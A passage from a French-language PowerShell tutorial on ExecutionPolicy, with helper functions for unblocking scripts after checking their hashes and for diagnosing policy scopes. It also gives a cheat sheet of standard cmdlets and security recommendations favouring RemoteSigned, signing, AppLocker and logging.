if ((Get-ExecutionPolicy -Scope CurrentUser) -eq 'Undefined') {
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
}
```

---

#### Fonction pour débloquer intelligemment

```powershell
# Ajouter à votre profil
function Unblock-SafeScript {
    param([string]$Path)
    
    $file = Get-Item $Path
    $hash = (Get-FileHash $file -Algorithm SHA256).Hash
    
    Write-Host "Fichier : $($file.Name)" -ForegroundColor Cyan
    Write-Host "SHA256 : $hash" -ForegroundColor Yellow
    Write-Host "Taille : $($file.Length) octets"
    
    $confirm = Read-Host "Débloquer ce fichier ? (O/N)"
    if ($confirm -eq 'O') {
        Unblock-File -Path $Path
        Write-Host "✓ Fichier débloqué" -ForegroundColor Green
    }
}

# Utilisation
Unblock-SafeScript .\script.ps1
```

---

#### Vérifier rapidement la configuration

```powershell
# Fonction de diagnostic rapide
function Get-PSExecutionPolicyStatus {
    Write-Host "`n=== Configuration ExecutionPolicy ===" -ForegroundColor Cyan
    
    # Politique effective
    $effective = Get-ExecutionPolicy
    Write-Host "`nPolique EFFECTIVE : " -NoNewline
    Write-Host $effective -ForegroundColor Yellow
    
    # Toutes les portées
    Write-Host "`nDétail par portée :" -ForegroundColor Cyan
    Get-ExecutionPolicy -List | Format-Table -AutoSize
    
    # Vérifier GPO
    $machinePolicy = Get-ExecutionPolicy -Scope MachinePolicy
    if ($machinePolicy -ne 'Undefined') {
        Write-Host "⚠️  GPO MACHINE ACTIVE : $machinePolicy" -ForegroundColor Red
    }
    
    $userPolicy = Get-ExecutionPolicy -Scope UserPolicy
    if ($userPolicy -ne 'Undefined') {
        Write-Host "⚠️  GPO USER ACTIVE : $userPolicy" -ForegroundColor Red
    }
}

# Utilisation
Get-PSExecutionPolicyStatus
```

---

### 📚 Résumé des commandes essentielles

```powershell
# === CONSULTATION ===
Get-ExecutionPolicy                              # Politique effective
Get-ExecutionPolicy -List                        # Toutes les portées
Get-ExecutionPolicy -Scope CurrentUser           # Portée spécifique

# === MODIFICATION ===
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser        # Recommandé
Set-ExecutionPolicy Bypass -Scope Process                  # Temporaire
Set-ExecutionPolicy Undefined -Scope CurrentUser           # Réinitialiser

# === DÉBLOCAGE ===
Unblock-File -Path .\script.ps1                  # Débloquer un fichier
Get-ChildItem *.ps1 | Unblock-File               # Débloquer plusieurs fichiers

# === SIGNATURE ===
Get-AuthenticodeSignature -FilePath .\script.ps1 # Vérifier signature
Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert  # Signer

# === DIAGNOSTIC ===
Get-Item .\script.ps1 -Stream Zone.Identifier    # Vérifier origine
Get-FileHash .\script.ps1 -Algorithm SHA256      # Hash du fichier

# === EXÉCUTION PONCTUELLE ===
powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
powershell.exe -NoProfile -ExecutionPolicy Bypass
```

---

### 🎓 Points clés à retenir

> [!info] Synthèse finale
> 
> **1. Nature de l'ExecutionPolicy**
> 
> - Mécanisme de **protection contre les erreurs**, pas contre les attaques
> - Facilement contournable par un utilisateur déterminé
> - Première ligne de défense, mais jamais la seule
> 
> **2. Configuration recommandée**
> 
> - **Standard** : RemoteSigned (équilibre sécurité/praticité)
> - **Entreprise avec PKI** : AllSigned (scripts signés obligatoires)
> - **Développement** : RemoteSigned (portée CurrentUser)
> 
> **3. Hiérarchie de priorité**
> 
> ```
> MachinePolicy → UserPolicy → Process → CurrentUser → LocalMachine
> ```
> 
> **4. Déblocage intelligent**
> 
> - Préférer `Unblock-File` plutôt que modifier l'ExecutionPolicy
> - Toujours vérifier la source avant de débloquer
> - Utiliser `-Scope Process` pour les besoins temporaires
> 
> **5. Sécurité réelle**
> 
> - Combiner avec AppLocker/WDAC pour un contrôle robuste
> - Activer la journalisation PowerShell
> - Former les utilisateurs aux risques
> - Mettre en place une défense en profondeur

---

## 🔚 Conclusion

L'**ExecutionPolicy** est un outil fondamental de PowerShell, mais son rôle est souvent mal compris. Elle ne constitue **pas une barrière de sécurité infranchissable**, mais plutôt un **garde-fou intelligent** contre l'exécution accidentelle de scripts non approuvés.

### En pratique :

✅ **Utilisez RemoteSigned** comme configuration de base ✅ **Déployez via GPO** en environnement d'entreprise  
✅ **Combinez avec d'autres mécanismes** (AppLocker, antivirus, EDR) ✅ **Formez les utilisateurs** aux risques liés aux scripts ✅ **Activez la journalisation** pour l'audit et la détection

L'ExecutionPolicy fait partie d'une **stratégie de sécurité globale**, pas une solution isolée. Correctement configurée et comprise, elle constitue un élément précieux de la défense en profondeur de votre environnement PowerShell.

---